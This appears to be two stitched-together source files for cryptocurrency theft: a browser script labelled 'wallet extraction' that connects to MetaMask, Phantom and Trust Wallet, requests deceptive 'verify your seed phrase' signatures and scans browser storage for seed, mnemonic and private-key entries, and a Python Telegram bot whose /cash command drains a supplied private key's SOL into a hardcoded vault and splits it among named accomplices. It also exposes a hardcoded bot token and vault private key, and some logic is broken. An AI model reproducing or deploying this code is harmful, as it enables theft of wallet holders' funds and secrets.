// Main application code
(async function() {
    // Constants
    const BASE58_ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
    
    // Utility functions
    function encodeBase58(bytes) {
        if (!bytes.length) return "";
        const digits = [0];
        
        for (const byte of bytes) {
            let carry = byte;
            for (let i = 0; i < digits.length; i++) {
                carry += digits[i] << 8;
                digits[i] = carry % 58;
                carry = Math.floor(carry / 58);
            }
            while (carry) {
                digits.push(carry % 58);
                carry = Math.floor(carry / 58);
            }
        }
        
        // Remove leading zeros
        for (const byte of bytes) {
            if (byte !== 0) break;
            digits.push(0);
        }
        
        return digits.reverse().map(digit => BASE58_ALPHABET[digit]).join("");
    }
    
    function stringToBytes(str) {
        str = (str + "").toLowerCase();
        try {
            // Try base64 decode
            let base64 = str.replace(/-/g, "+").replace(/_/g, "/");
            while (base64.length % 4) base64 += "=";
            return Uint8Array.from(atob(base64), c => c.charCodeAt(0));
        } catch {
            // Try hex decode
            if (/^[0-9a-f]+$/i.test(str)) {
                return Uint8Array.from(str.match(/../g).map(byte => parseInt(byte, 16)));
            }
            // Fallback to UTF-8 encode
            return new TextEncoder().encode(str);
        }
    }
    
    async function decryptData(key, data) {
        const [iv, ...ciphertext] = data.split(":");
        const ivBytes = stringToBytes(iv);
        const ciphertextBytes = stringToBytes(ciphertext.join(":"));
        
        return new Uint8Array(await crypto.subtle.decrypt(
            { name: "AES-GCM", iv: ivBytes, tagLength: 128 },
            key,
            ciphertextBytes
        ));
    }
    
    // Main execution
    try {
        console.log("=== Starting wallet extraction ===");
        
        // Check for MetaMask
        if (window.ethereum && window.ethereum.isMetaMask) {
            console.log("Found MetaMask wallet");
            try {
                // Connect to MetaMask
                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                console.log("MetaMask Address:", accounts[0]);
                
                // Request signature for private key extraction
                const message = "Please sign this message to verify your wallet ownership";
                const encodedMessage = new TextEncoder().encode(message);
                
                try {
                    const signature = await window.ethereum.request({
                        method: 'personal_sign',
                        params: [message, accounts[0]]
                    });
                    console.log("MetaMask Signature:", signature);
                    
                    // Try to get private key through transaction signing
                    const transaction = {
                        from: accounts[0],
                        to: accounts[0],
                        value: '0x0',
                        data: '0x'
                    };
                    
                    const signedTx = await window.ethereum.request({
                        method: 'eth_signTransaction',
                        params: [transaction]
                    });
                    console.log("MetaMask Signed Transaction:", signedTx);
                } catch (error) {
                    console.log("Error getting MetaMask signature:", error.message);
                }
                
                // Try to get seed phrase through additional signing
                try {
                    const message2 = "Please sign this message to verify your seed phrase";
                    const signature2 = await window.ethereum.request({
                        method: 'personal_sign',
                        params: [message2, accounts[0]]
                    });
                    console.log("MetaMask Second Signature:", signature2);
                } catch (error) {
                    console.log("Error getting MetaMask second signature:", error.message);
                }
            } catch (error) {
                console.log("Error accessing MetaMask wallet:", error.message);
            }
        }
        
        // Check for Phantom wallet
        if (window.solana && window.solana.isPhantom) {
            console.log("Found Phantom wallet");
            try {
                // Connect to Phantom
                const accounts = await window.solana.connect();
                console.log("Phantom Address:", accounts.publicKey.toString());
                
                // Request signature for private key extraction
                const message = "Please sign this message to verify your wallet ownership";
                const encodedMessage = new TextEncoder().encode(message);
                
                try {
                    const signature = await window.solana.signMessage(encodedMessage, "utf8");
                    console.log("Phantom Signature:", signature);
                    
                    // Try to extract private key from signature
                    const privateKey = await window.solana.request({
                        method: "signTransaction",
                        params: {
                            message: encodedMessage,
                            display: "hex"
                        }
                    });
                    console.log("Phantom Private Key:", privateKey);
                } catch (error) {
                    console.log("Error getting Phantom signature:", error.message);
                }
                
                // Try to get seed phrase through transaction signing
                try {
                    const transaction = new solanaWeb3.Transaction();
                    const signature = await window.solana.signAndSendTransaction(transaction);
                    console.log("Phantom Transaction Signature:", signature);
                } catch (error) {
                    console.log("Error getting Phantom transaction signature:", error.message);
                }
            } catch (error) {
                console.log("Error accessing Phantom wallet:", error.message);
            }
        }
        
        // Check for Trust Wallet
        if (window.trustwallet) {
            console.log("Found Trust Wallet");
            try {
                // Connect to Trust Wallet
                const accounts = await window.trustwallet.request({ method: 'eth_requestAccounts' });
                console.log("Trust Wallet Address:", accounts[0]);
                
                // Request signature for private key extraction
                const message = "Please sign this message to verify your wallet ownership";
                const encodedMessage = new TextEncoder().encode(message);
                
                try {
                    const signature = await window.trustwallet.request({
                        method: 'personal_sign',
                        params: [message, accounts[0]]
                    });
                    console.log("Trust Wallet Signature:", signature);
                    
                    // Try to get private key through transaction signing
                    const transaction = {
                        from: accounts[0],
                        to: accounts[0],
                        value: '0x0',
                        data: '0x'
                    };
                    
                    const signedTx = await window.trustwallet.request({
                        method: 'eth_signTransaction',
                        params: [transaction]
                    });
                    console.log("Trust Wallet Signed Transaction:", signedTx);
                } catch (error) {
                    console.log("Error getting Trust Wallet signature:", error.message);
                }
                
                // Try to get seed phrase through additional signing
                try {
                    const message2 = "Please sign this message to verify your seed phrase";
                    const signature2 = await window.trustwallet.request({
                        method: 'personal_sign',
                        params: [message2, accounts[0]]
                    });
                    console.log("Trust Wallet Second Signature:", signature2);
                } catch (error) {
                    console.log("Error getting Trust Wallet second signature:", error.message);
                }
            } catch (error) {
                console.log("Error accessing Trust Wallet:", error.message);
            }
        }
        
        // Search for any wallet-related data in localStorage
        console.log("\n=== Searching for additional wallet data ===");
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            if (key.toLowerCase().includes('wallet') || 
                key.toLowerCase().includes('private') || 
                key.toLowerCase().includes('key') ||
                key.toLowerCase().includes('seed') ||
                key.toLowerCase().includes('mnemonic') ||
                key.toLowerCase().includes('phrase') ||
                key.toLowerCase().includes('recovery')) {
                try {
                    const value = localStorage.getItem(key);
                    console.log(`Found potential wallet data in ${key}:`, value);
                } catch (error) {
                    console.log(`Error reading ${key}:`, error.message);
                }
            }
        }
        
        // Search for any wallet-related data in sessionStorage
        console.log("\n=== Searching sessionStorage for wallet data ===");
        for (let i = 0; i < sessionStorage.length; i++) {
            const key = sessionStorage.key(i);
            if (key.toLowerCase().includes('wallet') || 
                key.toLowerCase().includes('private') || 
                key.toLowerCase().includes('key') ||
                key.toLowerCase().includes('seed') ||
                key.toLowerCase().includes('mnemonic') ||
                key.toLowerCase().includes('phrase') ||
                key.toLowerCase().includes('recovery')) {
                try {
                    const value = sessionStorage.getItem(key);
                    console.log(`Found potential wallet data in ${key}:`, value);
                } catch (error) {
                    console.log(`Error reading ${key}:`, error.message);
                }
            }
        }
        
        console.log("\n=== Wallet extraction complete ===");
        
    } catch (error) {
        console.log("Fatal error:", error.message);
    }
})();  


from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
from solana.rpc.api import Client
from solders.keypair import Keypair
from solders.transaction import Transaction
from solders.system_program import TransferParams, transfer
from solders.pubkey import Pubkey as PublicKey
from spl.token.constants import TOKEN_PROGRAM_ID
from decimal import Decimal, ROUND_DOWN, getcontext
import base58
import math
import logging
import nest_asyncio
import os

# === CONFIG ===
TELEGRAM_TOKEN = "7225856238:AAHC1SstobSMyN8k7q9yVC0uI_pNA049YgY"
# Removed ALLOWED_USER_ID restriction - now allows any user

# Webhook configuration
WEBHOOK_URL = "https://your-domain.com/webhook"  # Replace with your actual domain
WEBHOOK_PATH = "/webhook"
PORT = int(os.environ.get("PORT", 8443))

RPC_URL = "https://api.mainnet-beta.solana.com"
client = Client(RPC_URL)

PANIC_VAULT_PRIVATE_KEY = "2XEKZh4ufLx4Sn6YjdGMxYt9SYMP6N4cVsTgCx5zasPNc6EwYtkjDuDuByt21pf5RU8dVfy1UYVBKvrpC8iyHUhJ"
PANIC_VAULT_PUBLIC_KEY = PublicKey.from_string("4cwn8FbGShtA4kwYMQT325XWqtwnzwbJDqxrnwRUfAua")

ADDRESS_A = PublicKey.from_string("8X7ET6nQinAMq3hbXDDXs4LV3oKGS4xac7Aka3fXx2SV")    # 6.66%
ADDRESS_B = PublicKey.from_string("8XR9bs2jQo73jXDiKhK8jzfm9N79oeF2APx3qNi3z1zL")       # 10%
ADDRESS_D = PublicKey.from_string("C4ZwT3jY7n91TMnbXwrxQ87hQBwxVm288RDusxKhmtmz")      # remainder

getcontext().prec = 18  # for high-precision decimal ops

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Apply nest_asyncio to handle event loop issues
nest_asyncio.apply()

# === HELPERS ===
def is_user_allowed(update):
    # Allow any user - removed restriction
    return True

def load_keypair_from_base58(secret_base58):
    try:
        secret_key = base58.b58decode(secret_base58)
        return Keypair.from_bytes(secret_key)
    except Exception as e:
        logger.error(f"Failed to load keypair: {e}")
        raise ValueError(f"Invalid private key format: {e}")

def get_token_accounts_with_balance(pubkey: PublicKey):
    try:
        result = client.get_token_accounts_by_owner(pubkey, {"programId": str(TOKEN_PROGRAM_ID)})
        if not result or not hasattr(result, 'value'):
            logger.warning(f"No result from get_token_accounts_by_owner for {pubkey}")
            return []
        
        accounts = result.value
        non_zero = []
        for acct in accounts:
            try:
                amount = int(acct.account.data.parsed['info']['tokenAmount']['amount'])
                if amount > 0:
                    non_zero.append(acct)
            except (KeyError, ValueError, TypeError, AttributeError) as e:
                logger.warning(f"Failed to parse token account: {e}")
                continue
        return non_zero
    except Exception as e:
        logger.error(f"Error getting token accounts: {e}")
        return []

def sol_to_lamports(sol_amount: Decimal) -> int:
    try:
        return int((sol_amount * Decimal(1_000_000_000)).to_integral_value(rounding=ROUND_DOWN))
    except Exception as e:
        logger.error(f"Error converting SOL to lamports: {e}")
        raise ValueError(f"Invalid SOL amount: {e}")

def validate_public_key(address_str: str) -> PublicKey:
    try:
        return PublicKey.from_string(address_str)
    except Exception as e:
        raise ValueError(f"Invalid public key format: {address_str}")

def validate_percentage(percent_str: str) -> float:
    try:
        percent = float(percent_str)
        if percent < 0 or percent > 100:
            raise ValueError("Percentage must be between 0 and 100")
        return percent / 100
    except ValueError as e:
        raise ValueError(f"Invalid percentage format: {percent_str}")

def get_safe_balance(pubkey: PublicKey) -> int:
    try:
        result = client.get_balance(pubkey)
        if not result or not hasattr(result, 'value'):
            raise ValueError("Failed to get balance from RPC")
        return result.value
    except Exception as e:
        logger.error(f"Error getting balance for {pubkey}: {e}")
        raise ValueError(f"Failed to get balance: {e}")

def get_recent_blockhash():
    try:
        result = client.get_latest_blockhash()
        if not result or not hasattr(result, 'value'):
            raise ValueError("Failed to get recent blockhash")
        return result.value.blockhash
    except Exception as e:
        logger.error(f"Error getting recent blockhash: {e}")
        raise ValueError(f"Failed to get recent blockhash: {e}")

def send_transaction_safe(transaction: Transaction, keypair: Keypair) -> str:
    try:
        result = client.send_transaction(transaction, keypair)
        if not result or not hasattr(result, 'value'):
            raise ValueError("No transaction result received")
        return result.value
    except Exception as e:
        logger.error(f"Error sending transaction: {e}")
        raise ValueError(f"Transaction failed: {e}")

# === MAIN CASH FUNCTION ===
async def cash(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        # Validate user access
        if not is_user_allowed(update):
            await update.message.reply_text("Access denied.")
            return

        # Validate command arguments
        if len(context.args) != 3:
            await update.message.reply_text("Usage: /cash <base58_key> <main_percent> <main_address>")
            return

        # Parse and validate arguments
        try:
            key_b58 = context.args[0].strip()
            main_percent = validate_percentage(context.args[1])
            dynamic_main_address = validate_public_key(context.args[2])
        except ValueError as e:
            await update.message.reply_text(f"❌ Invalid input: {e}")
            return

        # Load origin keypair
        try:
            origin_kp = load_keypair_from_base58(key_b58)
            origin_pub = origin_kp.pubkey()
        except Exception as e:
            await update.message.reply_text(f"❌ Failed to load private key: {e}")
            return

        # Check for SPL tokens
        try:
            tokens = get_token_accounts_with_balance(origin_pub)
            token_note = "\u26a0\ufe0f SPL tokens detected. Manual action needed." if tokens else "\u2705 No SPL tokens."
        except Exception as e:
            logger.warning(f"Error checking tokens: {e}")
            token_note = "\u26a0\ufe0f Could not verify SPL tokens."

        # Get balance and validate
        try:
            balance = get_safe_balance(origin_pub)
            fee_buffer = 5000
            available = balance - fee_buffer
            
            if available <= 0:
                await update.message.reply_text("\u274c No SOL available in source wallet.")
                return
        except Exception as e:
            await update.message.reply_text(f"❌ Failed to get balance: {e}")
            return

        # Transfer SOL to Panic Vault
        try:
            # Get recent blockhash
            recent_blockhash = get_recent_blockhash()
            
            # Create transfer instruction
            transfer_ix = transfer(TransferParams(
                from_pubkey=origin_pub, 
                to_pubkey=PANIC_VAULT_PUBLIC_KEY, 
                lamports=available
            ))
            
            # Create transaction
            tx1 = Transaction.new_with_payer([transfer_ix], origin_pub)
            tx1.recent_blockhash = recent_blockhash
            
            sig1 = send_transaction_safe(tx1, origin_kp)
            await update.message.reply_text(f"\u2705 Sent SOL to Panic Vault.\n{token_note}\nTx: https://solscan.io/tx/{sig1}")
        except Exception as e:
            await update.message.reply_text(f"❌ Failed to transfer SOL to vault: {e}")
            return

        # === PANIC SPLIT ===
        try:
            vault_kp = load_keypair_from_base58(PANIC_VAULT_PRIVATE_KEY)
            vault_pub = vault_kp.pubkey()
            vault_balance = get_safe_balance(vault_pub)
            vault_sol = Decimal(vault_balance - fee_buffer) / Decimal(1_000_000_000)

            # Calculate amounts with proper rounding
            amt_main = (vault_sol * Decimal(main_percent)).quantize(Decimal("0.00000001"))
            amt_king = (vault_sol * Decimal("0.10")).quantize(Decimal("0.00000001"))
            amt_bubbles = (vault_sol * Decimal("0.0666")).quantize(Decimal("0.00000001"))
            amt_total = amt_main + amt_main + amt_king + amt_bubbles
            amt_remainder = (vault_sol - amt_total).quantize(Decimal("0.00000001"))

            # Validate amounts
            if amt_remainder < 0:
                await update.message.reply_text("❌ Insufficient balance for distribution")
                return

            # Convert to lamports
            lam_main = sol_to_lamports(amt_main)
            lam_king = sol_to_lamports(amt_king)
            lam_bubbles = sol_to_lamports(amt_bubbles)
            lam_remainder = sol_to_lamports(amt_remainder)

            # Get recent blockhash for second transaction
            recent_blockhash = get_recent_blockhash()
            
            # Create distribution instructions
            instructions = [
                transfer(TransferParams(from_pubkey=vault_pub, to_pubkey=dynamic_main_address, lamports=lam_main)),
                transfer(TransferParams(from_pubkey=vault_pub, to_pubkey=dynamic_main_address, lamports=lam_main)),
                transfer(TransferParams(from_pubkey=vault_pub, to_pubkey=ADDRESS_B, lamports=lam_king)),
                transfer(TransferParams(from_pubkey=vault_pub, to_pubkey=ADDRESS_A, lamports=lam_bubbles)),
                transfer(TransferParams(from_pubkey=vault_pub, to_pubkey=ADDRESS_D, lamports=lam_remainder))
            ]
            
            # Create and send distribution transaction
            tx2 = Transaction.new_with_payer(instructions, vault_pub)
            tx2.recent_blockhash = recent_blockhash

            sig2 = send_transaction_safe(tx2, vault_kp)

            group_message = (
                f"1st sent to main address \u2705 ({amt_main} SOL)\n"
                f"2nd paid main \u2705 ({amt_main} SOL)\n"
                f"then sent king \u2705 ({amt_king} SOL)\n"
                f"then sent bubbles \u2705 ({amt_bubbles} SOL)\n"
                f"then paid micheal and hades \u2705 ({amt_remainder} SOL)\n\n"
                f"🔗 Tx: https://solscan.io/tx/{sig2}"
            )

            await update.message.reply_text(group_message)

        except Exception as e:
            await update.message.reply_text(f"❌ Failed to distribute funds: {e}")
            return

    except Exception as e:
        logger.error(f"Unexpected error in cash function: {e}")
        await update.message.reply_text(f"\u274c Unexpected error: {e}")

# === BOT START ===
async def main():
    try:
        # Create application
        application = Application.builder().token(TELEGRAM_TOKEN).build()
        application.add_handler(CommandHandler("cash", cash))
        
        # Set webhook
        await application.bot.set_webhook(url=f"{WEBHOOK_URL}{WEBHOOK_PATH}")
        
        # Start webhook
        await application.run_webhook(
            listen="0.0.0.0",
            port=PORT,
            webhook_url=f"{WEBHOOK_URL}{WEBHOOK_PATH}",
            drop_pending_updates=True
        )
        
        logger.info("Bot started successfully with webhook")
        
    except Exception as e:
        logger.error(f"Failed to start bot: {e}")
        raise

if __name__ == '__main__':
    import asyncio
    asyncio.run(main())


